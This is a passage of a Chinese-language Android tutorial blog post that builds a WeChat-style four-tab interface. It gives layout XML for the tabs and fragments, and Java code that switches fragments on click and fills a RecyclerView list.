class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_wx_img"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"50dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:src</span>=<span class="hljs-string">"@drawable/wx"</span>/&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_wx_txt"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"126dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"聊天"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@color/white"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"30sp"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_friend"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"bottom"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_friend_img"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"50dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:src</span>=<span class="hljs-string">"@drawable/txl"</span> /&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_friend_txt"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"126dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@color/white"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"30sp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"通讯"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_address"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"bottom"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_address_img"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"50dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:src</span>=<span class="hljs-string">"@drawable/find"</span> /&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_address_txt"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"126dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@color/white"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"30sp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"发现"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_setting"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"bottom"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ImageView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_setting_img"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"50dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:src</span>=<span class="hljs-string">"@drawable/w"</span> /&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/id_tab_setting_txt"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"126dp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@color/white"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:background</span>=<span class="hljs-string">"@color/black"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"30sp"</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:text</span>=<span class="hljs-string">"我的"</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><h4 id="4个fragment-xml"><a href="#4个fragment-xml" class="headerlink" title="4个fragment-xml"></a>4个fragment.xml</h4><p>通过一个xml文件将标题栏部分和底部选择栏部分添加到一个xml文件里面，再两个文件中间添加一个content部件，将四个fragment当做卡片压入中间主体部分。四个fragment的xml文件类似，故只放一个文件的内容。</p><h4 id="fragment-lt-xml"><a href="#fragment-lt-xml" class="headerlink" title="fragment-lt-xml"></a>fragment_lt.xml</h4><p>第一个聊天界面我设置列表效果，只需要添加一个 recycleview 实现列表效果即可</p><p><strong>图片</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/13/61eu2EynqloQswm.png'><img src="https://s2.loli.net/2023/10/13/61eu2EynqloQswm.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">"http://schemas.android.com/apk/res-auto"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">".ltFragment"</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">androidx.recyclerview.widget.RecyclerView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/recyclerview"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintBottom_toBottomOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintEnd_toEndOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintStart_toStartOf</span>=<span class="hljs-string">"parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">app:layout_constraintTop_toTopOf</span>=<span class="hljs-string">"parent"</span> /&gt;</span><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">FrameLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>其他3个xml页面设置为介绍界面即可，效果和代码如下所示</p><p><strong>图片</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/31QLvmXP4fCwKuY.png'><img src="https://s2.loli.net/2023/10/07/31QLvmXP4fCwKuY.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">".ltFragment"</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- <span class="hljs-doctag">TODO:</span> Update blank fragment layout --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"35sp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"这是聊天界面"</span> /&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">FrameLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><p>上文已经在相应的 fragment_lt.xml 文件里面添加了 recycleview，此时再添加一个item.xml页面用于页面显示，只包含一个textview</p><h4 id="item-xml"><a href="#item-xml" class="headerlink" title="item-xml"></a>item.xml</h4><p><strong>图片</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/13/fNWuZhcMX5bKT7A.png'><img src="https://s2.loli.net/2023/10/13/fNWuZhcMX5bKT7A.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">TextView</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/itemview"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:text</span>=<span class="hljs-string">"TextView"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textColor</span>=<span class="hljs-string">"@android:color/black"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:textSize</span>=<span class="hljs-string">"40sp"</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><h4 id="main-xml"><a href="#main-xml" class="headerlink" title="main-xml"></a>main.xml</h4><p><strong>图片</strong></p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/xF9R5W23D6QLmYI.png'><img src="https://s2.loli.net/2023/10/07/xF9R5W23D6QLmYI.png" alt="image.png"></p><p><strong>代码</strong></p><figure class="highlight xml"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"utf-8"</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">LinearLayout</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:tools</span>=<span class="hljs-string">"http://schemas.android.com/tools"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">xmlns:app</span>=<span class="hljs-string">"http://schemas.android.com/apk/res-auto"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">android:orientation</span>=<span class="hljs-string">"vertical"</span></span><br><span class="hljs-tag">    <span class="hljs-attr">tools:context</span>=<span class="hljs-string">".MainActivity"</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">layout</span>=<span class="hljs-string">"@layout/top"</span> &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">FrameLayout</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:id</span>=<span class="hljs-string">"@+id/content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"wrap_content"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"0dp"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_gravity</span>=<span class="hljs-string">"center"</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:layout_weight</span>=<span class="hljs-string">"1"</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">FrameLayout</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">include</span> <span class="hljs-attr">layout</span>=<span class="hljs-string">"@layout/bottom"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span><br><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">LinearLayout</span>&gt;</span><br></code></pre></td></tr></tbody></table></figure><h3 id="3-Java文件代码编写"><a href="#3-Java文件代码编写" class="headerlink" title="3-Java文件代码编写"></a>3. Java文件代码编写</h3><p>首先依次创建4个fragement</p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/tbo9lg6mc5QpLex.png'><img src="https://s2.loli.net/2023/10/07/tbo9lg6mc5QpLex.png" alt="image.png"></p><p>会在相应的layout文件夹下生成4个.xml文件</p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/hcxenEHgb2JQpdv.png'><img src="https://s2.loli.net/2023/10/07/hcxenEHgb2JQpdv.png" alt="image.png"></p><p>目前的界面只是一个比较简单的界面，需要完成的功能仅有展示和通过点击部件更换中间部分展示的界面，所以要考虑的代码部分分别为以下四个内容：</p><blockquote><ol><li>点击监听部分onclick</li></ol></blockquote><blockquote><ol start="2"><li>将4个fragment压入content里面的代码部分</li></ol></blockquote><blockquote><ol start="3"><li>将四个卡片隐藏起来的代码部分</li></ol></blockquote><blockquote><ol start="4"><li>当点击时展示的界面代码部分</li></ol></blockquote><p>创建4个Frangment变量、1个管理对象FragmentManager变量 、4个LinearLayout变量对象</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Fragment fragment1,fragment2,fragment3,fragment4;<br>    FragmentManager fm;<br>    LinearLayout linearLayout1,linearLayout2,linearLayout3,linearLayout4;<br></code></pre></td></tr></tbody></table></figure><p>新建一个inital函数用以给Fragment页面初始化，在此函数中，将此前定义个4个Fragment变量使用fragmentManager添加到main文件中的中间主体部分的布局中</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">inital</span><span class="hljs-params">()</span> {<br><br>    <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>            .add(R.id.content,fragment1)<br>            .add(R.id.content,fragment2)<br>            .add(R.id.content,fragment3)<br>            .add(R.id.content,fragment4);<br>    ft.commit();<br><br>}<br></code></pre></td></tr></tbody></table></figure><p>在点击四个部件时需要展示其所代表的界面，故编写新的一个函数showfragment，展示fragment界面</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fragmentshow</span><span class="hljs-params">(Fragment fragment)</span> {<br>       <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>               .show(fragment);<br>       transaction.commit();<br>   }<br></code></pre></td></tr></tbody></table></figure><p>而在切换界面时，需要对原先的界面进行隐藏之后再展示所需界面，故编写一个新的函数fragmentHide，将所有的fragment界面都隐藏</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fragmenthide</span><span class="hljs-params">()</span> {<br>        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> fm.beginTransaction()<br>                .hide(fragment1)<br>                .hide(fragment2)<br>                .hide(fragment3)<br>                .hide(fragment4);<br>        ft.commit();<br>    }<br></code></pre></td></tr></tbody></table></figure><p>仅对底部选择栏的四个控件进行监听，并根据监听所得到的结果调用fragment界面</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">linearLayout1.setOnClickListener(<span class="hljs-built_in">this</span>);<br>   linearLayout2.setOnClickListener(<span class="hljs-built_in">this</span>);<br>   linearLayout3.setOnClickListener(<span class="hljs-built_in">this</span>);<br>   linearLayout4.setOnClickListener(<span class="hljs-built_in">this</span>);<br></code></pre></td></tr></tbody></table></figure><p>注意这里设置了全局监听</p><p>因此要修改和覆写onClick函数</p><p>修改此处</p><p class='item-img' data-src='https://s2.loli.net/2023/10/07/MEQiFDCcrvHIzdy.png'><img src="https://s2.loli.net/2023/10/07/MEQiFDCcrvHIzdy.png" alt="image.png"></p><p>覆写onClick函数</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View view)</span> {<br>        fragmenthide();<br>        <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_wx){<br>            fragmentshow(fragment1);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_friend){<br>            fragmentshow(fragment2);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (view.getId()==R.id.id_tab_address){<br>            fragmentshow(fragment3);<br>        }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(view.getId()==R.id.id_tab_setting){<br>            fragmentshow(fragment4);<br>        }<br>    }<br></code></pre></td></tr></tbody></table></figure><p>而在最开始的界面自然就是聊天界面，故在最开始的时候就调用聊天的fragment</p><figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">fragmentshow</span>(fragment1);<br></code></pre></td></tr></tbody></table></figure><hr><p>由于点击聊天要实现列表功能，固还需要在 ltfragment 里面实现 recycleview 功能</p><p>我们先初始化定义一些变量recyclerView，list，context， myadapter（一个适配器）</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> RecyclerView recyclerView;<br><span class="hljs-keyword">private</span> List&lt;String&gt; list;<br><span class="hljs-keyword">private</span> Context context;<br><span class="hljs-keyword">private</span> Myadapter myadapter;<br></code></pre></td></tr></tbody></table></figure><p>然后我们开始在onCreateView（）函数底下写入适配器需要的一些参数和数据：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> View <span class="hljs-title function_">onCreateView</span><span class="hljs-params">(LayoutInflater inflater, ViewGroup container,</span><br><span class="hljs-params">                         Bundle savedInstanceState)</span> {<br>    View view=inflater.inflate(R.layout.fragment_lt,container,<span class="hljs-literal">false</span>);<br>    context=view.getContext();<br>    recyclerView=view.findViewById(R.id.recyclerview);<br>    list=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>    initData();<span class="hljs-comment">//初始化数据</span><br>    LinearLayoutManager manager=<span class="hljs-keyword">new</span> <span class="hljs-title class_">LinearLayoutManager</span>(context);<br>    manager.setOrientation(LinearLayoutManager.VERTICAL);<br><br>    myadapter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myadapter</span>(context,list);<br><br>    recyclerView.setAdapter(myadapter);<br>    recyclerView.setLayoutManager(manager);<br>    recyclerView.addItemDecoration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DividerItemDecoration</span>(context,LinearLayoutManager.VERTICAL));<br>    <span class="hljs-keyword">return</span> view;<br><br>    <span class="hljs-comment">// 